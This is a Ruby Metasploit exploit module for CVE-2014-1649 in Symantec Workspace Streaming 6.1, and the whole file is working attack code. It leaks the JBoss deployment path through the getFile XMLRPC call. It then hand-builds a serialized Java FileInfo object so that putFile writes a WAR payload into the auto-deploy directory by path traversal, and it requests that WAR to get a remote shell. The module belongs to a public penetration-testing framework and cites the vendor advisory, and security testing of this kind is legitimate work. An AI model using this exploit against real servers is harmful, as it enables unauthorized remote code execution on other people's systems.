##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include REXML

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Symantec Workspace Streaming Arbitrary File Upload',
      'Description' => %q{
        This module exploits a code execution flaw in Symantec Workspace Streaming. The
        vulnerability exists in the ManagementAgentServer.putFile XMLRPC call exposed by the
        as_agent.exe service, which allows for uploading arbitrary files under the server root.
        This module abuses the auto deploy feature in the JBoss as_ste.exe instance in order
        to achieve remote code execution. This module has been tested successfully on Symantec
        Workspace Streaming 6.1 SP8 and Windows 2003 SP2. Abused services listen on a single
        machine deployment, and also in the backend role in a multiple machine deployment.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-1649'],
          ['BID', '67189'],
          ['ZDI', '14-127'],
          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20140512_00']
        ],
      'Privileged'  => true,
      'Platform'    => 'java',
      'Arch' => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'Symantec Workspace Streaming 6.1 SP8 / Java Universal', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 12 2014'))

    register_options(
      [
        Opt::RPORT(9855), # as_agent.exe (afuse XMLRPC to upload arbitrary file)
        OptPort.new('STE_PORT', [true, "The remote as_ste.exe AS server port", 9832]), # as_ste.exe (abuse jboss auto deploy)
      ], self.class)
  end

  def send_xml_rpc_request(xml)
    res = send_request_cgi(
      {
        'uri'     => normalize_uri("/", "xmlrpc"),
        'method'  => 'POST',
        'ctype'   => 'text/xml; charset=UTF-8',
        'data'    => xml
      })

    res
  end

  def build_soap_get_file(file_path)
    xml = Document.new
    xml.add_element(
        "methodCall",
        {
            'xmlns:ex' => "http://ws.apache.org/xmlrpc/namespaces/extensions"
        })
    method_name = xml.root.add_element("methodName")
    method_name.text = "ManagementAgentServer.getFile"

    params = xml.root.add_element("params")

    param_server_root = params.add_element("param")
    value_server_root = param_server_root.add_element("value")
    value_server_root.text = "*AWESE"

    param_file_type = params.add_element("param")
    value_file_type = param_file_type.add_element("value")
    type_file_type = value_file_type.add_element("i4")
    type_file_type.text = "0" # build path from the server root directory

    param_file_name = params.add_element("param")
    value_file_name = param_file_name.add_element("value")
    value_file_name.text = file_path

    param_file_binary = params.add_element("param")
    value_file_binary = param_file_binary.add_element("value")
    type_file_binary = value_file_binary.add_element("boolean")
    type_file_binary.text = "0"

    xml << XMLDecl.new("1.0", "UTF-8")

    xml.to_s
  end

  def build_soap_put_file(file)
    xml = Document.new
    xml.add_element(
        "methodCall",
        {
            'xmlns:ex' => "http://ws.apache.org/xmlrpc/namespaces/extensions"
        })
    method_name = xml.root.add_element("methodName")
    method_name.text = "ManagementAgentServer.putFile"

    params = xml.root.add_element("params")

    param_server_root = params.add_element("param")
    value_server_root = param_server_root.add_element("value")
    value_server_root.text = "*AWESE"

    param_file_type = params.add_element("param")
    value_file_type = param_file_type.add_element("value")
    type_file_type = value_file_type.add_element("i4")
    type_file_type.text = "0" # build path from the server root directory

    param_file = params.add_element("param")
    value_file = param_file.add_element("value")
    type_value_file = value_file.add_element("ex:serializable")
    type_value_file.text = file

    xml << XMLDecl.new("1.0", "UTF-8")

    xml.to_s
  end

  def build_soap_check_put
    xml = Document.new
    xml.add_element(
        "methodCall",
        {
            'xmlns:ex' => "http://ws.apache.org/xmlrpc/namespaces/extensions"
        })
    method_name = xml.root.add_element("methodName")
    method_name.text = "ManagementAgentServer.putFile"
    xml.root.add_element("params")
    xml << XMLDecl.new("1.0", "UTF-8")
    xml.to_s
  end

  def parse_method_response(xml)
    doc = Document.new(xml)
    file = XPath.first(doc, "methodResponse/params/param/value/ex:serializable")

    unless file.nil?
      file = Rex::Text.decode_base64(file.text)
    end

    file
  end

  def get_file(path)
    xml_call = build_soap_get_file(path)
    file = nil

    res = send_xml_rpc_request(xml_call)

    if res && res.code == 200 && res.body
      file = parse_method_response(res.body.to_s)
    end

    file
  end

  def put_file(file)
    result = nil
    xml_call = build_soap_put_file(file)

    res = send_xml_rpc_request(xml_call)

    if res && res.code == 200 && res.body
      result = parse_method_response(res.body.to_s)
    end

    result
  end

  def upload_war(war_name, war, dst)
    result = false
    java_file = build_java_file_info("#{dst}#{war_name}", war)
    java_file = Rex::Text.encode_base64(java_file)

    res = put_file(java_file)

    if res && res =~ /ReturnObject.*StatusMessage.*Boolean/
      result = true
    end

    result
  end

  def jboss_deploy_path
    path = nil
    leak = get_file("bin/CreateDatabaseSchema.cmd")

    if leak && leak =~ /\[INSTALLDIR\](.*)ste\/ste.jar/
      path = $1
    end

    path
  end

  def check
    check_result = Exploit::CheckCode::Safe

    if jboss_deploy_path.nil?
      xml = build_soap_check_put
      res = send_xml_rpc_request(xml)

      if res && res.code == 200 && res.body && res.body.to_s =~ /No method matching arguments/
        check_result =  Exploit::CheckCode::Detected
      end
    else
      check_result =  Exploit::CheckCode::Appears
    end

    check_result
  end

  def exploit
    print_status("#{peer} - Leaking the jboss deployment directory...")
    jboss_path =jboss_deploy_path

    if jboss_path.nil?
      fail_with(Exploit::Unknown, "#{peer} - Failed to disclose the jboss deployment directory")
    end

    print_status("#{peer} - Building WAR payload...")

    app_name = Rex::Text.rand_text_alpha(4 + rand(4))
    war_name = "#{app_name}.war"
    war = payload.encoded_war({ :app_name => app_name }).to_s
    deploy_dir = "..#{jboss_path}"

    print_status("#{peer} - Uploading WAR payload...")

    res = upload_war(war_name, war, deploy_dir)

    unless res
      fail_with(Exploit::Unknown, "#{peer} - Failed to upload the war payload")
    end

    register_files_for_cleanup("../server/appstream/deploy/#{war_name}")

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("#{rhost}:#{ste_port} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi(
        {
          'uri'    => normalize_uri("/", app_name, Rex::Text.rand_text_alpha(rand(8)+8)),
          'method' => 'GET',
          'rport'  => ste_port # Auto Deploy can be reached through the "as_ste.exe" service
        })
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end

  end

  def ste_port
    datastore['STE_PORT']
  end

  # com.appstream.cm.general.FileInfo serialized object
  def build_java_file_info(file_name, contents)
    stream =  "\xac\xed" # stream magic
    stream << "\x00\x05" # stream version
    stream << "\x73" # new Object

    stream << "\x72" # TC_CLASSDESC
    stream << ["com.appstream.cm.general.FileInfo".length].pack("n")
    stream << "com.appstream.cm.general.FileInfo"
    stream << "\xa3\x02\xb6\x1e\xa1\x6b\xf0\xa7" # class serial version identifier
    stream << "\x02" # flags SC_SERIALIZABLE
    stream << [6].pack("n") # number of fields in the class

    stream << "Z" # boolean
    stream << ["bLastPage".length].pack("n")
    stream << "bLastPage"

    stream << "J" # long
    stream << ["lFileSize".length].pack("n")
    stream << "lFileSize"

    stream << "[" # array
    stream << ["baContent".length].pack("n")
    stream << "baContent"
    stream << "\x74" # TC_STRING
    stream << ["[B".length].pack("n")
    stream << "[B" # field's type (byte array)

    stream << "L" # Object
    stream << ["dTimeStamp".length].pack("n")
    stream << "dTimeStamp"
    stream << "\x74" # TC_STRING
    stream << ["Ljava/util/Date;".length].pack("n")
    stream << "Ljava/util/Date;" #field's type (Date)

    stream << "L" # Object
    stream << ["sContent".length].pack("n")
    stream << "sContent"
    stream << "\x74" # TC_STRING
    stream << ["Ljava/lang/String;".length].pack("n")
    stream << "Ljava/lang/String;" #field's type (String)

    stream << "L" # Object
    stream << ["sFileName".length].pack("n")
    stream << "sFileName"
    stream << "\x71" # TC_REFERENCE
    stream << [0x007e0003].pack("N") # handle

    stream << "\x78" # TC_ENDBLOCKDATA
    stream << "\x70" # TC_NULL

    # Values
    stream << [1].pack("c") # bLastPage

    stream << [0xffffffff, 0xffffffff].pack("NN") # lFileSize

    stream << "\x75" # TC_ARRAY
    stream << "\x72" # TC_CLASSDESC
    stream << ["[B".length].pack("n")
    stream << "[B" # byte array)
    stream << "\xac\xf3\x17\xf8\x06\x08\x54\xe0" # class serial version identifier
    stream << "\x02" # flags SC_SERIALIZABLE
    stream << [0].pack("n") # number of fields in the class
    stream << "\x78" # TC_ENDBLOCKDATA
    stream << "\x70" # TC_NULL
    stream << [contents.length].pack("N")
    stream << contents # baContent

    stream << "\x70" # TC_NULL # dTimeStamp

    stream << "\x70" # TC_NULL # sContent

    stream << "\x74" # TC_STRING
    stream << [file_name.length].pack("n")
    stream << file_name # sFileName

    stream
  end

end